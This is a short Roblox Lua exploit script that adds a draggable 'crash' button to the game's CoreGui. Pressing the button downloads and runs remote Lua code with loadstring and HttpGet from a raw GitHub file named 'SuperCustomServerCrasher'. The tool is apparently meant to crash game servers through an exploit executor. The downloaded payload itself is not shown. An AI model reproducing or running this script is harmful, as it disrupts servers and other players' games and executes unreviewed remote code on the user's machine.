-- crash
-- made by wezentjuh#9052

local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local crash = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui
main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
main.Position = UDim2.new(0.85728848, 0, 0.399999976, 0)
main.Size = UDim2.new(0, 140, 0, 42)
main.Active = true
main.Draggable = true

crash.Name = "crash"
crash.Parent = main
crash.BackgroundColor3 = Color3.fromRGB(255, 76, 41)
crash.BorderColor3 = Color3.fromRGB(8, 32, 50)
crash.BorderSizePixel = 2
crash.Position = UDim2.new(-0.014892119, 0, 0, 0)
crash.Size = UDim2.new(0, 134, 0, 41)
crash.Font = Enum.Font.Ubuntu
crash.Text = "crash"
crash.TextColor3 = Color3.fromRGB(255, 255, 255)
crash.TextSize = 35.000
crash.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
crash.MouseButton1Down:connect (function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
end)